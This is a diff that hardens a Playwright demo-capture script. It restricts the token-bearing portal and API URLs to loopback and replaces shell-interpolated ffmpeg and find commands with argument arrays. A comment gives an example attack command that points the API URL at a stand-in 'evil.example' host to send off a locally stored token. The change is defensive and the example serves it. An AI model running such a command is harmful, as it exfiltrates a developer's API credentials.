@@ -6,15 +6,32 @@
 //     mode = terminal-test : login -> board -> terminal demo (quick validation)
 //     mode = full          : whole lifecycle (long; run in background)
 import { chromium } from '@playwright/test';
-import { execSync } from 'node:child_process';
+import { execFileSync, execSync } from 'node:child_process';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
+import { assertNotOption, findFilesUnder } from './argv-safety.cjs';
+
+// Both URLs below carry the developer's API token (Authorization header), and
+// both come from environment variables. Pin them to loopback: without this,
+// `AIFACTORY_API_URL=http://evil.example node scripts/demo-capture-full.mjs`
+// posts a token read from ~/.aifactory/.token straight off the machine
+// (CodeQL js/file-access-to-http). This script is a local capture harness --
+// loopback is the entire legitimate destination set; port-forward anything
+// remote.
+const LOOPBACK = new Set(['localhost', '127.0.0.1', '[::1]', '::1']);
+function loopbackOnly(raw, envName) {
+  const host = new URL(raw).hostname;
+  if (!LOOPBACK.has(host)) {
+    throw new Error(`${envName}=${raw}: refusing to send the local API token to ${host}; port-forward to localhost instead`);
+  }
+  return raw;
+}
 
 const MODE = process.argv[2] || 'full';
 const OUT = process.argv[3] || '/tmp/aifactory-demo-full';
-const PORTAL = process.env.AIFACTORY_PORTAL_URL || 'http://localhost:3100';
-const API = process.env.AIFACTORY_API_URL || 'http://localhost:3101';
+const PORTAL = loopbackOnly(process.env.AIFACTORY_PORTAL_URL || 'http://localhost:3100', 'AIFACTORY_PORTAL_URL');
+const API = loopbackOnly(process.env.AIFACTORY_API_URL || 'http://localhost:3101', 'AIFACTORY_API_URL');
 const PID = process.env.AIFACTORY_PROJECT_ID || 'f7ac8d99-b913-4c6f-afce-f8376e29c98c';
 const TOKEN = fs.readFileSync(path.join(os.homedir(), '.aifactory', '.token'), 'utf8').trim();
 const TITLE = process.env.DEMO_TITLE || 'Add /status endpoint';
@@ -31,19 +48,25 @@ function findChrome() {
     const p = path.join(root, v, 'chrome-linux64', 'chrome');
     if (fs.existsSync(p)) return p;
   }
-  try { return execSync(`find -L ${root} -maxdepth 3 -type f -name chrome 2>/dev/null | head -1`).toString().trim(); } catch { return undefined; }
+  try { return findFilesUnder(root, 'chrome') || undefined; } catch { return undefined; }
 }
 
 function ffmpegBin() {
-  try { const p = execSync('command -v ffmpeg').toString().trim(); if (p) return p; } catch {}
-  const root = process.env.PLAYWRIGHT_BROWSERS_PATH || '';
-  try { const p = execSync(`find -L ${root} -maxdepth 3 -type f -name 'ffmpeg*' 2>/dev/null | head -1`).toString().trim(); if (p) return p; } catch {}
+  // Constant command, no interpolation -- `command` is a shell builtin, so this
+  // one legitimately needs a shell.
+  try { const p = execSync('command -v ffmpeg', { encoding: 'utf8' }).trim(); if (p) return p; } catch {}
+  try { const p = findFilesUnder(process.env.PLAYWRIGHT_BROWSERS_PATH || '', 'ffmpeg*'); if (p) return p; } catch {}
   return 'ffmpeg';
 }
 
 function probeDuration(ff, f) {
   try {
-    const o = execSync(`'${ff}' -i '${f}' 2>&1 | grep Duration | head -1`).toString();
+    // ffmpeg writes the stream summary to stderr and exits non-zero with no
+    // output file; capture stderr and grep in JS rather than through a pipeline.
+    let o = '';
+    try {
+      execFileSync(assertNotOption(ff, 'ffmpeg path'), ['-i', f], { encoding: 'utf8', stdio: ['ignore', 'ignore', 'pipe'] });
+    } catch (err) { o = err.stderr || ''; }
     const m = o.match(/Duration: (\d+):(\d+):(\d+\.\d+)/);
     if (m) return (+m[1]) * 3600 + (+m[2]) * 60 + (+m[3]);
   } catch {}
@@ -65,7 +88,15 @@ function transcode(webm, outMp4, introEnd, gateStart) {
     `[0:v]trim=${a.toFixed(2)}:${g.toFixed(2)},setpts=(PTS-STARTPTS)*${midMul.toFixed(4)}[s1];` +
     `[0:v]trim=${g.toFixed(2)},setpts=(PTS-STARTPTS)[s2];` +
     `[s0][s1][s2]concat=n=3:v=1[m];[m]scale=1280:-2[outv]`;
-  execSync(`'${ff}' -y -i '${webm}' -filter_complex "${filter}" -map "[outv]" -r 24 -pix_fmt yuv420p -movflags +faststart -an '${outMp4}'`, { stdio: 'ignore' });
+  // argv array: `ff` comes from `find` output / the environment, and `filter`
+  // is built from run timings, so neither may reach a shell.
+  execFileSync(assertNotOption(ff, 'ffmpeg path'), [
+    '-y', '-i', webm,
+    '-filter_complex', filter,
+    '-map', '[outv]',
+    '-r', '24', '-pix_fmt', 'yuv420p', '-movflags', '+faststart', '-an',
+    outMp4,
+  ], { stdio: 'ignore' });
   return outMp4;
 }
 
